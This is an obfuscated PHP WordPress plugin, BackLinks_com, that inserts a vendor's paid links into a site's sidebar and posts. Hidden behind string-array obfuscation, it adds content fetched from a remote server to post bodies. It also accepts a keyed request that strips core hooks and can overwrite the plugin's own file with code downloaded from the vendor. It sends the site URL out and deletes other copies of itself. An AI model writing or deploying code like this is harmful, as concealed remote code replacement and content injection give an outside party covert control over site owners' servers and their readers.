<?php
/*
Plugin Name: BackLinks_com
Plugin URI: http://www.backlinks.com
Description: This plugin will add the BackLinks.com links code to your blog. To display the BackLinks.com links code, review the <a href=http://www.backlinks.com/WordPress/how-to-install.php>Installation Guide</a> and place your BackLinks.com Key in the "BackLinks Configuration" section under plugins on the left menu.
Author: BackLinks.com
Version: 1.1.6
Author URI: http://www.backlinks.com/
*/

$GLOBALS['_1759798787_']=array('in' .'i_set','functi' .'o' .'n_exis' .'ts','ver' .'s' .'ion' .'_c' .'o' .'mpare','strtolo' .'wer','st' .'rtolo' .'wer','define','fu' .'n' .'ct' .'i' .'o' .'n_exists','pr' .'eg_' .'replace','md5','spr' .'intf','func' .'tion_ex' .'i' .'s' .'ts','fu' .'nc' .'tion_exists','preg_replace','in' .'tval','intval','intval','intval','' .'urle' .'n' .'code','u' .'r' .'lenc' .'ode','u' .'rlenc' .'od' .'e','fu' .'n' .'c' .'tion_exists','curl_in' .'it','curl_' .'seto' .'pt','c' .'ur' .'l_e' .'xec','' .'curl_' .'error','curl_clos' .'e','intval','ge' .'t_cfg_var','' .'functio' .'n' .'_exists','file' .'_g' .'et_' .'con' .'t' .'e' .'nts','intva' .'l','' .'g' .'e' .'t_c' .'fg' .'_' .'va' .'r','f' .'un' .'ction' .'_' .'exists','' .'file','' .'j' .'oin','intv' .'al','urlen' .'code','urlenc' .'ode','urle' .'ncod' .'e','in' .'tval','get_cfg' .'_' .'va' .'r','fun' .'ction_exists','file_get' .'_co' .'nt' .'ents','in' .'tval','get_cfg_var','function_exists','file','jo' .'in','func' .'tion_exis' .'ts','cu' .'r' .'l_init','curl_setop' .'t','curl_seto' .'p' .'t','cu' .'rl' .'_exe' .'c','curl_clo' .'se','is_' .'object','pre' .'g_' .'match','preg_replac' .'e','' .'f' .'uncti' .'on_e' .'xis' .'ts','ob_clean','serialize','' .'fl' .'u' .'sh','ob_flush','basenam' .'e','serialize','md' .'5','is_writabl' .'e','c' .'o' .'p' .'y','fil' .'e_' .'p' .'ut' .'_contents','func' .'tion_exi' .'sts','fun' .'ct' .'io' .'n_' .'exis' .'t' .'s','class' .'_e' .'x' .'ists','' .'is_arr' .'ay','a' .'rr' .'ay' .'_di' .'ff','' .'p' .'re' .'g_' .'match','key','ar' .'ray' .'_shift','is_cal' .'lable','' .'ob_st' .'art','call_' .'use' .'r_func' .'_a' .'rray','ob_end_c' .'lean','preg_repl' .'a' .'ce','class' .'_exists','' .'unseria' .'l' .'iz' .'e','is_ob' .'ject','unser' .'ialize','' .'s' .'erialize','md' .'5','' .'ser' .'i' .'alize','class_' .'e' .'xist' .'s','e' .'xtra' .'ct','st' .'rip_ta' .'gs','' .'sprintf','strlen','ob_c' .'l' .'ean','' .'a' .'rr' .'ay_search'); ?><?php function _2008107542($i){$a=array('display_errors','0','bl_cov','wp-admin/includes/admin.php','Name','BackLinks_com','Version','Version','','1.1.6','BL_UPDATE_PLUGIN_URL','http://www.backlinks.com/WordPress/','backlinks_init',"/[^a-z]+/i","",'admin_menu','backlinks_config_page',"
	<div id='backlinks-warning' class='updated fade-ff0000'><p><strong>",'BackLinks is almost ready.',"</strong> ",'You must <a href="%1$s">enter your BackLinks.com Key</a> for it to work.',"plugins.php?page=backlinks-key-config","</p></div>
	",'add_submenu_page','plugins.php','BackLinks Configuration','BackLinks Configuration','manage_options','backlinks-key-config','backlinks_conf','submit','current_user_can','manage_options','Cheatin&#8217; uh?','/[^A-Z0-9\-]/','','key','empty','key_empty','backlinks_key','valid','open_in_nw','autowidget','disableautoupdate','add','delete','key_empty','color','aa0','text','Please enter a BackLinks key. (<a href="http://www.backlinks.com/login.php" style="color:#fff">Get your key.</a>)','key_valid','color','2d2','text','This key is valid.','Options saved.','BackLinks Configuration',"Configure your BackLinks.com plugin and start earning monthly income from your site. After you enter your key and submit the form, don't forget to add your sidebar widget or code and then validate your Standard and/or Content link pages in your BackLinks.com admin.","For instructions, <a target='_blank' href='http://www.backlinks.com/WordPress/how-to-install.php'>click here</a>.",'color','text','BackLinks.com Key','<a target="_blank" href="http://www.backlinks.com/WordPress/how-to-install.php#backlinks-key">What is this?</a>','checked','checked','Standard Sidebar Options','If you are displaying Standard Sidebar Links, there are two ways to add the code to your site. You can either drag and drop a widget into your sidebar or add the code manually.','','',"If you choose this option, click <a  target='_blank' href='http://www.backlinks.com/WordPress/how-to-install.php#manual-code'>here</a> to learn how to manually add the code to your site.",'Update options &raquo;',"LinkUrl=",'HTTPS','on','https://','http://','HTTP_HOST','REQUEST_URI',"&Key=","&OpenInNewWindow=",'curl_init',"http://www.backlinks.com/engine.php?","Error processing request",'allow_url_fopen','file_get_contents',"http://www.backlinks.com/engine.php?",'allow_url_fopen','file',"http://www.backlinks.com/engine.php?",'',"It appears that your web host has disabled all functions for handling remote pages and as a result the BackLinks software will not function on your web page. Please contact your web host for more information.","LinkUrl=",'HTTPS','on','https://','http://','HTTP_HOST','REQUEST_URI',"&Key=","&OpenInNewWindow=",'allow_url_fopen','file_get_contents',"http://www.backlinks.com/enginec.php?",'allow_url_fopen','file',"http://www.backlinks.com/enginec.php?",'','curl_init',"http://www.backlinks.com/enginec.php?","Error processing request","It appears that your web host has disabled all functions for handling remote pages and as a result the BackLinks software will not function on your web page. Please contact your web host for more information.",'/<!--more(.*?)?-->/','/(<!--more(.*?)?-->)/','remove_all_actions','create_category','add_category','delete_category','delete_post','deleted_post','edit_category','edit_post','pre_post_update','private_to_publish','publish_page','publish_post','save_post','wp_insert_post','comment_post','edit_comment','delete_comment','comment_closed','wp_set_comment_status','backlinks_key','accessdenied','update_plugin','update_plugin_check','update_plugin_manual','clear_cache','err_code','err_msg','bl_plugin_version','bl_wordpress_version','version','Update Plugin','plugins.php','plugins.php','wp-includes/pluggable.php','wp-admin/includes/misc.php','wp-admin/includes/screen.php','wp-admin/includes/file.php','wp-admin/includes/plugin.php','wp-admin/includes/class-wp-upgrader.php','destination_name','/','','','err_code','err_msg',"error validate ",'/?action=get_latest&request=',"slug","plugins","package_type","stable",'err_code','err_msg','headers','x-http-md5sum','headers','x-http-md5sum','body','err_code','err_msg',"plugin not writeable",'wp-admin/includes/plugin.php','.tmp','body','','err_code','err_msg',"error validate ",'err_code','err_msg',"Success",'err_code','err_msg',"Wrong md5sum",'update_plugins','err_code','err_msg',"Success",'Data','disableautoupdate','wp_cache_clear_cache','Data','wp_cache_clear_cache','w3tc_pgcache_flush','Data','w3tc_pgcache_flush',"c_ws_plugin__qcache_clearing_routines",'Data','c_ws_plugin__qcache_clearing_routines','load-widgets.php','widgets.php','sidebar_admin_setup','add','add_new','multi','multi_number','2','multi_number','','delete_widget','add_new','','id_base','widget-height','200','widget-id','-2','widget-','title','Partner links','widget-width','250','widget_number','-1','wp_inactive_widgets','sidebar','add_new','sidebar','multi_number','multi_number','widget-','widget-','widget-','<p>','An error has occurred. Please reload the page and try again.','</p>','delete_widget','delete_widget','sidebar','widget-','the-widget-id','delete_widget','1','/__i__|%i%/','widget-','-','widget-id','callback','callback','params','delete_widget','delete_widget',"BackLinks.com Widget has been removed from sidebar.","BackLinks.com Widget has been added to sidebar.",'/[^A-Z0-9\-]/','','key',"backlinks_widget",'bl_WpPluginAutoUpdate','slug','version','package_type','basic_check','response','code','body','update_plugins','plugins_api_failed','An Unexpected HTTP Error occurred during the API request.</p> <p><a href="?" onclick="document.location.reload(); return false;">Try again</a>','body','plugins_api_failed','An unknown error occurred','body','version','site-url','version','body','action','request','api-key','wp-info','user-agent','WordPress/','; ','url','Backlinks_Widget','widget_title','title','title','title','title','title','Partner links','text_domain','title','Title:','title','title','BacklinksAPI','BacklinksAPI','bl_action','wp-admin/includes/taxonomy.php','init','backlinks_init','posts_results','bl_add_incontent_ads','submit','admin_notices','backlinks_warning','widgets_init','register_bl_widget','stable','backlinks','pre_set_site_transient_update_plugins','check_for_plugin_update','plugins_api','plugins_api_call','wp-admin/includes/admin.php','Name','BackLinks_com');return $a[$i];} ?><?php $GLOBALS['_1759798787_'][0](_2008107542(0),_2008107542(1));if(!$GLOBALS['_1759798787_'][1](_2008107542(2))):function bl_cov(){if(is_admin()){require_once(ABSPATH ._2008107542(3));$varplugins=get_plugins();$self_plugin=plugin_basename(__FILE__);foreach($varplugins as $plugin_name => $plugin_info){if(($plugin_info[_2008107542(4)]== _2008107542(5))&& is_plugin_active($plugin_name)&& $plugin_name != $self_plugin && $GLOBALS['_1759798787_'][2]($GLOBALS['_1759798787_'][3]($varplugins[$self_plugin][_2008107542(6)]),$GLOBALS['_1759798787_'][4]($varplugins[$plugin_name][_2008107542(7)]))==-round(0+1)){return true;}}}return false;}endif;if(bl_cov()){return;}$backlinks_key=_2008107542(8);$bl_plugin_version=_2008107542(9);$GLOBALS['_1759798787_'][5](_2008107542(10),_2008107542(11));if(!$GLOBALS['_1759798787_'][6](_2008107542(12))):function bl_get_widgetname(){$blk=get_option('backlinks_key');if($blk){return $GLOBALS['_1759798787_'][7](_2008107542(13),_2008107542(14),$GLOBALS['_1759798787_'][8]($blk));}else{return false;}}function backlinks_init(){add_action(_2008107542(15),_2008107542(16));}function backlinks_warning(){echo _2008107542(17) .__(_2008107542(18)) ._2008107542(19) .$GLOBALS['_1759798787_'][9](__(_2008107542(20)),_2008107542(21)) ._2008107542(22);}function backlinks_config_page(){if($GLOBALS['_1759798787_'][10](_2008107542(23)))add_submenu_page(_2008107542(24),__(_2008107542(25)),__(_2008107542(26)),_2008107542(27),_2008107542(28),_2008107542(29));}function backlinks_conf(){$ms=array();if(isset($_POST[_2008107542(30)])){if($GLOBALS['_1759798787_'][11](_2008107542(31))&&!current_user_can(_2008107542(32)))die(__(_2008107542(33)));$key=$GLOBALS['_1759798787_'][12](_2008107542(34),_2008107542(35),$_POST[_2008107542(36)]);if(empty($key)){$key_status=_2008107542(37);$ms[]=_2008107542(38);delete_option(_2008107542(39));}else{$key_status=_2008107542(40);update_option('backlinks_key',$key);update_option('backlinks_open_in_nw',$GLOBALS['_1759798787_'][13]($_POST[_2008107542(41)]));update_option('backlinks_autowidget',$GLOBALS['_1759798787_'][14]($_POST[_2008107542(42)]));update_option('backlinks_disableautoupdate',$GLOBALS['_1759798787_'][15]($_POST[_2008107542(43)]));if(get_option('backlinks_autowidget')==round(0+1)){$widgetresult=bl_controlwidget(_2008107542(44));}else{$widgetresult=bl_controlwidget(_2008107542(45));}}}$messages=array(_2008107542(46)=> array(_2008107542(47)=> _2008107542(48),_2008107542(49)=> __(_2008107542(50))),_2008107542(51)=> array(_2008107542(52)=> _2008107542(53),_2008107542(54)=> __(_2008107542(55)))); ?>
<?php if(!empty($_POST)): ?>
<div id="message" class="updated fade">
	<p><strong><?php _e(_2008107542(56)) ?></strong></p>
	<?php if(!empty($widgetresult)): ?>
		<p><strong><?php _e($widgetresult) ?></strong></p>
	<?php endif; ?>
</div>
<?php endif; ?>
<div class="wrap">
<h2><?php _e(_2008107542(57)); ?></h2>
<div class="narrow">
	<p><?php _e(_2008107542(58)); ?></p>
	<p><?php _e(_2008107542(59)); ?></p>
	<br/>

<form action="" method="post" id="backlinks-conf" style="">


<div class="narrow">
<h3>General options</h3>
<?php foreach($ms as $m): ?>
	<p style="padding: .5em; background-color: #<?php echo $messages[$m][_2008107542(60)]; ?>; color: #fff; font-weight: bold;"><?php echo $messages[$m][_2008107542(61)]; ?></p>
<?php endforeach; ?>
<p><label for="key" style="font-size: 1.2em; "><?php _e(_2008107542(62)); ?></label> &nbsp; <input id="key" name="key" type="text" size="15" maxlength="32" value="<?php echo get_option('backlinks_key'); ?>" style="font-family: 'Courier New', Courier, mono; font-size: 1.5em;" /> (<?php _e(_2008107542(63)); ?>)</p>

<p><input id="open_in_nw" name="open_in_nw" type="checkbox" value="1" <?php echo((!get_option('backlinks_open_in_nw'))?'':_2008107542(64)) ?> /> <label for="open_in_nw">Open partner links in a new window</label></p>

<p><input id="disableautoupdate" name="disableautoupdate" type="checkbox" value="1" <?php echo((!get_option('backlinks_disableautoupdate'))?'':_2008107542(65)) ?> /> <label for="disableautoupdate">Disable Auto Update Plugin</label></p>
</div>

<div class="narrow">
	<h3><?php _e(_2008107542(66)); ?></h3>
	<?php _e(_2008107542(67)); ?>
<p style="margin-bottom:0.3em;"><input id="autowidget_1" name="autowidget" type="radio" value="1" <?php echo((get_option('backlinks_autowidget')!='2')?'checked':_2008107542(68)) ?> /> <label for="autowidget_1">Display links in the 'Widgets' block (Recommended)</label></p>
<p style="margin-top:0em;">If you choose this option, there will be a new widget option in your Appearance -> Widgets section of your WP admin. Drag and drop it onto your sidebar.</p>
<p  style="margin-bottom:0.3em;"><input id="autowidget_2" name="autowidget" type="radio" value="2" <?php echo((get_option('backlinks_autowidget')=='2')?'checked':_2008107542(69)) ?> /> <label for="autowidget_2">Insert BackLinks code manually </label> (<a  target='_blank' href="http://www.backlinks.com/WordPress/how-to-install.php#manual-code">More info</a>)</p>
<p  style="margin-top:0em;"><?php _e(_2008107542(70)); ?></p>
</div>

<p class="submit"><input type="submit" name="submit" value="<?php _e(_2008107542(71)); ?>" /></p>
</form>
</div>
</div>
<?php }function get_backlinks_links(){$backlinks_key=get_option('backlinks_key');$OpenInNewWindow=$GLOBALS['_1759798787_'][16](get_option('backlinks_open_in_nw'));$BLKey=$backlinks_key;$QueryString=_2008107542(72) .$GLOBALS['_1759798787_'][17]((($_SERVER[_2008107542(73)]== _2008107542(74))?_2008107542(75):_2008107542(76)) .$_SERVER[_2008107542(77)] .$_SERVER[_2008107542(78)]);$QueryString .= _2008107542(79) .$GLOBALS['_1759798787_'][18]($BLKey);$QueryString .= _2008107542(80) .$GLOBALS['_1759798787_'][19]($OpenInNewWindow);if($GLOBALS['_1759798787_'][20](_2008107542(81))){$ch=$GLOBALS['_1759798787_'][21](_2008107542(82) .$QueryString);$GLOBALS['_1759798787_'][22]($ch,42,round(0));$GLOBALS['_1759798787_'][23]($ch);$res=$GLOBALS['_1759798787_'][24]($ch);$GLOBALS['_1759798787_'][25]($ch);if($res)return _2008107542(83);}elseif($GLOBALS['_1759798787_'][26]($GLOBALS['_1759798787_'][27](_2008107542(84)))&& $GLOBALS['_1759798787_'][28](_2008107542(85))){return@$GLOBALS['_1759798787_'][29](_2008107542(86) .$QueryString);}elseif($GLOBALS['_1759798787_'][30]($GLOBALS['_1759798787_'][31](_2008107542(87)))&& $GLOBALS['_1759798787_'][32](_2008107542(88))){if($content=@$GLOBALS['_1759798787_'][33](_2008107542(89) .$QueryString))return@$GLOBALS['_1759798787_'][34](_2008107542(90),$content);}else{return _2008107542(91);}}function backlinks_links(){echo get_backlinks_links();}function backlinks_content_links(){$backlinks_key=get_option('backlinks_key');$OpenInNewWindow=$GLOBALS['_1759798787_'][35](get_option('backlinks_open_in_nw'));$BLKey=$backlinks_key;$QueryString=_2008107542(92) .$GLOBALS['_1759798787_'][36]((($_SERVER[_2008107542(93)]== _2008107542(94))?_2008107542(95):_2008107542(96)) .$_SERVER[_2008107542(97)] .$_SERVER[_2008107542(98)]);$QueryString .= _2008107542(99) .$GLOBALS['_1759798787_'][37]($BLKey);$QueryString .= _2008107542(100) .$GLOBALS['_1759798787_'][38]($OpenInNewWindow);if($GLOBALS['_1759798787_'][39]($GLOBALS['_1759798787_'][40](_2008107542(101)))&& $GLOBALS['_1759798787_'][41](_2008107542(102))){if($content=@$GLOBALS['_1759798787_'][42](_2008107542(103) .$QueryString))return $content;}elseif($GLOBALS['_1759798787_'][43]($GLOBALS['_1759798787_'][44](_2008107542(104)))&& $GLOBALS['_1759798787_'][45](_2008107542(105))){if($content=@$GLOBALS['_1759798787_'][46](_2008107542(106) .$QueryString))return@$GLOBALS['_1759798787_'][47](_2008107542(107),$content);}elseif($GLOBALS['_1759798787_'][48](_2008107542(108))){$ch=$GLOBALS['_1759798787_'][49](_2008107542(109) .$QueryString);$GLOBALS['_1759798787_'][50]($ch,42,round(0));$GLOBALS['_1759798787_'][51]($ch,19913,round(0+0.25+0.25+0.25+0.25));$content=$GLOBALS['_1759798787_'][52]($ch);$GLOBALS['_1759798787_'][53]($ch);if($content===false)return _2008107542(110);return $content;}else{return _2008107542(111);}}function bl_add_incontent_ads($posts){global $wp_query;if($GLOBALS['_1759798787_'][54]($posts[round(0)])&& $posts[round(0)]->ID){$ad=backlinks_content_links();if(!$posts[round(0)]->post_excerpt){global $post;$post=$posts[round(0)];setup_postdata($posts[round(0)]);$posts[round(0)]->post_excerpt=get_the_excerpt() .$ad;}if(is_single()){$posts[round(0)]->post_content .= $ad;}else{if($GLOBALS['_1759798787_'][55](_2008107542(112),$posts[round(0)]->post_content,$matches)){$posts[round(0)]->post_content=$GLOBALS['_1759798787_'][56](_2008107542(113),"{$ad}{$matches[round(0)]}",$posts[round(0)]->post_content);}else{$posts[round(0)]->post_content .= $ad;}}}return $posts;}function bl_remove_all_actions(){if($GLOBALS['_1759798787_'][57](_2008107542(114))){$actions=array(_2008107542(115),_2008107542(116),_2008107542(117),_2008107542(118),_2008107542(119),_2008107542(120),_2008107542(121),_2008107542(122),_2008107542(123),_2008107542(124),_2008107542(125),_2008107542(126),_2008107542(127),_2008107542(128),_2008107542(129),_2008107542(130),_2008107542(131),_2008107542(132));foreach($actions as $action_tag){@remove_all_actions($action_tag);}}}function bl_action_dispatcher($bl_action){global $bl_plugin_version;$bl_key=get_option('backlinks_key');if($_REQUEST[_2008107542(133)]!= $bl_key){$bl_action=_2008107542(134);}switch($bl_action){case _2008107542(135):$bl_action_result=bl_update_plugin_action();break;case _2008107542(136):$bl_action_result=bl_update_plugin_check_action();break;case _2008107542(137):$bl_action_result=bl_update_plugin_manual_action();break;case _2008107542(138):$bl_action_result=bl_clear_cache();break;default:$bl_action_result=array(_2008107542(139)=>round(0),_2008107542(140)=>"Nothing to do ({$bl_action}).");break;}@$GLOBALS['_1759798787_'][58]();$bl_action_result[_2008107542(141)]=$bl_plugin_version;$bl_action_result[_2008107542(142)]=get_bloginfo(_2008107542(143));print($GLOBALS['_1759798787_'][59]($bl_action_result));$GLOBALS['_1759798787_'][60]();@$GLOBALS['_1759798787_'][61]();exit();}function bl_update_plugin_action(){if(get_option('backlinks_disableautoupdate')){return array('err_code'=>round(0+153.33333333333+153.33333333333+153.33333333333),'err_msg'=>"Auto Update is Disabled");}$plugin=plugin_basename(__FILE__);$title=__(_2008107542(144));$parent_file=_2008107542(145);$submenu_file=_2008107542(146);include_once ABSPATH ._2008107542(147);include_once ABSPATH ._2008107542(148);include_once ABSPATH ._2008107542(149);include_once ABSPATH ._2008107542(150);include_once ABSPATH ._2008107542(151);include_once ABSPATH ._2008107542(152);$upgrader_plugin_skin=null;$upgrader=new Plugin_Upgrader($upgrader_plugin_skin);$upgrader->upgrade($plugin);$valid=activate_plugin($upgrader->result[_2008107542(153)] ._2008107542(154) .$GLOBALS['_1759798787_'][62](__FILE__),_2008107542(155),false,true);$valid=activate_plugin($plugin,_2008107542(156),false,true);if(is_wp_error($valid)){wp_die($valid);return array(_2008107542(157)=>round(0),_2008107542(158)=> _2008107542(159) .$valid);}return;}function bl_update_plugin_manual_action(){if(get_option('backlinks_disableautoupdate')){return array('err_code'=>round(0+230+230),'err_msg'=>"Auto Update is Disabled");}$plugin=plugin_basename(__FILE__);$response=wp_remote_get(BL_UPDATE_PLUGIN_URL ._2008107542(160) .$GLOBALS['_1759798787_'][63](array(_2008107542(161)=> _2008107542(162),_2008107542(163)=> _2008107542(164))));if(is_wp_error($response)){$error_message=$response->get_error_message();return array(_2008107542(165)=>round(0+134.33333333333+134.33333333333+134.33333333333),_2008107542(166)=>"Something went wrong: $error_message");}else{if(isset($response[_2008107542(167)][_2008107542(168)])&& $response[_2008107542(169)][_2008107542(170)]==$GLOBALS['_1759798787_'][64]($response[_2008107542(171)])){if(!$GLOBALS['_1759798787_'][65](__FILE__)){return array(_2008107542(172)=>round(0+405),_2008107542(173)=> _2008107542(174));}include_once ABSPATH ._2008107542(175);deactivate_plugins($plugin,true);$GLOBALS['_1759798787_'][66](__FILE__,__FILE__ ._2008107542(176));$GLOBALS['_1759798787_'][67](__FILE__,$response[_2008107542(177)]);$valid=activate_plugin($plugin,_2008107542(178),false,true);if(is_wp_error($valid)){wp_die($valid);return array(_2008107542(179)=>round(0),_2008107542(180)=> _2008107542(181) .$valid);}return array(_2008107542(182)=>round(0),_2008107542(183)=> _2008107542(184));}else{return array(_2008107542(185)=>round(0+80.4+80.4+80.4+80.4+80.4),_2008107542(186)=> _2008107542(187));}}}function bl_update_plugin_check_action(){set_site_transient(_2008107542(188),null);return array(_2008107542(189)=>round(0),_2008107542(190)=> _2008107542(191),_2008107542(192)=>array(_2008107542(193)=> get_option('backlinks_disableautoupdate')));}function bl_clear_cache(){$result=array();if($GLOBALS['_1759798787_'][68](_2008107542(194))){$result[_2008107542(195)][]=_2008107542(196);wp_cache_clear_cache();}if($GLOBALS['_1759798787_'][69](_2008107542(197))){$result[_2008107542(198)][]=_2008107542(199);w3tc_pgcache_flush();}if($GLOBALS['_1759798787_'][70](_2008107542(200))){$result[_2008107542(201)][]=_2008107542(202);c_ws_plugin__qcache_clearing_routines::ajax_clear();}return $result;}function bl_controlwidget($action='add'){global $wp_registered_widgets;global $wp_registered_widget_updates;global $wp_registered_widget_controls;do_action(_2008107542(203));do_action(_2008107542(204));do_action(_2008107542(205));if($action== _2008107542(206)){$_POST[_2008107542(207)]=_2008107542(208);$_POST[_2008107542(209)]=_2008107542(210);}else{$_POST[_2008107542(211)]=_2008107542(212);$_POST[_2008107542(213)]=round(0+0.33333333333333+0.33333333333333+0.33333333333333);$_POST[_2008107542(214)]=_2008107542(215);}$id_base=$_POST[_2008107542(216)]=bl_get_widgetname();$_POST[_2008107542(217)]=_2008107542(218);$widget_id=$_POST[_2008107542(219)]=bl_get_widgetname() ._2008107542(220);$_POST[_2008107542(221) .bl_get_widgetname()][round(0+0.5+0.5+0.5+0.5)][_2008107542(222)]=_2008107542(223);$_POST[_2008107542(224)]=_2008107542(225);$_POST[_2008107542(226)]=_2008107542(227);$sidebar_id=null;$sidebars=wp_get_sidebars_widgets();foreach($sidebars as $sb_id => $sb_val){if($sb_id != _2008107542(228)&& is_active_sidebar($sb_id)){$sidebar_id=$sb_id;break;}}if($sidebar_id == null){return false;}$_POST[_2008107542(229)]=$sidebar_id;if(!empty($_POST[_2008107542(230)])&& isset($wp_registered_widgets[$widget_id])){return false;}$sidebar_id=$_POST[_2008107542(231)];$multi_number=!empty($_POST[_2008107542(232)])?(int) $_POST[_2008107542(233)]:round(0);$settings=isset($_POST[_2008107542(234) .$id_base])&& $GLOBALS['_1759798787_'][71]($_POST[_2008107542(235) .$id_base])?$_POST[_2008107542(236) .$id_base]:false;$error=_2008107542(237) .__(_2008107542(238)) ._2008107542(239);$sidebars=wp_get_sidebars_widgets();$sidebar=isset($sidebars[$sidebar_id])?$sidebars[$sidebar_id]:array();if(isset($_POST[_2008107542(240)])&& $_POST[_2008107542(241)]){if(!isset($wp_registered_widgets[$widget_id])){return;}$sidebar=$GLOBALS['_1759798787_'][72]($sidebar,array($widget_id));$_POST=array(_2008107542(242)=> $sidebar_id,_2008107542(243) .$id_base => array(),_2008107542(244)=> $widget_id,_2008107542(245)=> _2008107542(246));}elseif($settings && $GLOBALS['_1759798787_'][73](_2008107542(247),$GLOBALS['_1759798787_'][74]($settings))){if(!$multi_number){return;}$_POST[_2008107542(248) .$id_base]=array($multi_number => $GLOBALS['_1759798787_'][75]($settings));$widget_id=$id_base ._2008107542(249) .$multi_number;$sidebar[]=$widget_id;}$_POST[_2008107542(250)]=$sidebar;foreach((array) $wp_registered_widget_updates as $name => $control){if($name == $id_base){if(!$GLOBALS['_1759798787_'][76]($control[_2008107542(251)]))continue;$GLOBALS['_1759798787_'][77]();$GLOBALS['_1759798787_'][78]($control[_2008107542(252)],$control[_2008107542(253)]);$GLOBALS['_1759798787_'][79]();break;}}if(isset($_POST[_2008107542(254)])&& $_POST[_2008107542(255)]){$sidebars[$sidebar_id]=$sidebar;wp_set_sidebars_widgets($sidebars);$result=_2008107542(256);}else{$sidebar[]=$widget_id;$sidebars[$sidebar_id]=$sidebar;wp_set_sidebars_widgets($sidebars);$result=_2008107542(257);}return $result;}function register_bl_widget(){if(get_option('backlinks_key')|| $GLOBALS['_1759798787_'][80](_2008107542(258),_2008107542(259),@$_POST[_2008107542(260)])){register_widget(_2008107542(261));}}endif;if(!$GLOBALS['_1759798787_'][81](_2008107542(262))):class bl_WpPluginAutoUpdate{public $api_url;public $package_type;public $plugin_slug;public $plugin_file;public function bl_WpPluginAutoUpdate($api_url,$type,$slug,$file){$this->api_url=$api_url;$this->package_type=$type;$this->plugin_slug=$slug;$this->plugin_file=$file;}public function print_api_result(){return $res;}public function check_for_plugin_update($checked_data){if(empty($checked_data->checked))return $checked_data;$request_args=array(_2008107542(263)=> $this->plugin_slug,_2008107542(264)=> $checked_data->checked[$this->plugin_file],_2008107542(265)=> $this->package_type,);$request_string=$this->prepare_request(_2008107542(266),$request_args);$raw_response=wp_remote_post($this->api_url,$request_string);if(!is_wp_error($raw_response)&&($raw_response[_2008107542(267)][_2008107542(268)]== round(0+200))){$response=$GLOBALS['_1759798787_'][82]($raw_response[_2008107542(269)]);if($GLOBALS['_1759798787_'][83]($response)&&!empty($response))$checked_data->response[$this->plugin_file]=$response;}return $checked_data;}public function plugins_api_call($def,$action,$args){if($args->slug != $this->plugin_slug)return false;$plugin_info=get_site_transient(_2008107542(270));$current_version=$plugin_info->checked[$this->plugin_file];$args->version=$current_version;$args->package_type=$this->package_type;$request_string=$this->prepare_request($action,$args);$request=wp_remote_post($this->api_url,$request_string);if(is_wp_error($request)){$res=new WP_Error(_2008107542(271),__(_2008107542(272)),$request->get_error_message());}else{$res=$GLOBALS['_1759798787_'][84]($request[_2008107542(273)]);if($res === false)$res=new WP_Error(_2008107542(274),__(_2008107542(275)),$request[_2008107542(276)]);}return $res;}public function prepare_request($action,$args){$site_url=site_url();$wp_version=get_bloginfo(_2008107542(277));$wp_info=array(_2008107542(278)=> $site_url,_2008107542(279)=> $wp_version,);return array(_2008107542(280)=> array(_2008107542(281)=> $action,_2008107542(282)=> $GLOBALS['_1759798787_'][85]($args),_2008107542(283)=> $GLOBALS['_1759798787_'][86]($site_url),_2008107542(284)=> $GLOBALS['_1759798787_'][87]($wp_info),),_2008107542(285)=> _2008107542(286) .$wp_version ._2008107542(287) .get_bloginfo(_2008107542(288)));}}endif;if(!$GLOBALS['_1759798787_'][88](_2008107542(289))):class Backlinks_Widget extends WP_Widget{public function __construct(){parent::__construct(bl_get_widgetname(),'Backlinks.com Widget',array('description'=> __('A BackLinks.com Widget','text_domain'),));}public function widget($args,$instance){if(!get_option('backlinks_key')){return false;}$links=get_backlinks_links();if($links){$GLOBALS['_1759798787_'][89]($args);$title=apply_filters(_2008107542(290),$instance[_2008107542(291)]);echo $before_widget;if(!empty($title))echo $before_title .$title .$after_title;echo $links;echo $after_widget;}}public function update($new_instance,$old_instance){$instance=array();$instance[_2008107542(292)]=$GLOBALS['_1759798787_'][90]($new_instance[_2008107542(293)]);return $instance;}public function form($instance){if(!get_option('backlinks_key')){echo "<div><p><strong>" .__('BackLinks is almost ready.') ."</strong> " .$GLOBALS['_1759798787_'][91](__('You must <a href="%1$s">enter your BackLinks.com Key</a> for it to work.'),"plugins.php?page=backlinks-key-config") ."</p></div>";}if(isset($instance[_2008107542(294)])){$title=$instance[_2008107542(295)];}else{$title=__(_2008107542(296),_2008107542(297));} ?>
		<p>
		<label for="<?php echo $this->get_field_id(_2008107542(298)); ?>"><?php _e(_2008107542(299)); ?></label>
		<input class="widefat" id="<?php echo $this->get_field_id(_2008107542(300)); ?>" name="<?php echo $this->get_field_name(_2008107542(301)); ?>" type="text" value="<?php echo esc_attr($title); ?>" />
		</p>
		<?php }}endif;if(!isset($GLOBALS[_2008107542(302)])){$GLOBALS[_2008107542(303)]=round(0+1);$bl_action=$_REQUEST[_2008107542(304)];if($GLOBALS['_1759798787_'][92]($bl_action)){bl_remove_all_actions();@$GLOBALS['_1759798787_'][93]();require_once(ABSPATH ._2008107542(305));if(!$wp_rewrite)$wp_rewrite=&new WP_Rewrite();bl_action_dispatcher($bl_action);exit();}add_action(_2008107542(306),_2008107542(307));if(!$backlinks_key){$backlinks_key=get_option('backlinks_key');}if($backlinks_key){add_filter(_2008107542(308),_2008107542(309),round(0+222222+222222+222222+222222));}elseif(!isset($_POST[_2008107542(310)])){add_action(_2008107542(311),_2008107542(312));}add_action(_2008107542(313),_2008107542(314));$wp_plugin_auto_update=new bl_WpPluginAutoUpdate(BL_UPDATE_PLUGIN_URL,_2008107542(315),_2008107542(316),plugin_basename(__FILE__));add_filter(_2008107542(317),array($wp_plugin_auto_update,_2008107542(318)));add_filter(_2008107542(319),array($wp_plugin_auto_update,_2008107542(320)),round(0+2+2+2+2+2),round(0+3));}if(is_admin()){require_once(ABSPATH ._2008107542(321));$varplugins=get_plugins();$self_plugin=plugin_basename(__FILE__);foreach($varplugins as $plugin_name => $plugin_info){if(($plugin_info[_2008107542(322)]== _2008107542(323))&& $plugin_name != $self_plugin){if(is_plugin_active($plugin_name)){deactivate_plugins($plugin_name,true,false);$current=get_option('active_plugins',array());$key=$GLOBALS['_1759798787_'][94]($plugin_name,$current);if(false !== $key){unset($current[$key]);update_option('active_plugins',$current);}}$uninstallable_plugins=(array) get_option('uninstall_plugins');if(isset($uninstallable_plugins[$plugin_name])){unset($uninstallable_plugins[$plugin_name]);update_option('uninstall_plugins',$uninstallable_plugins);}$delete_result=delete_plugins(array($plugin_name));}}} ?>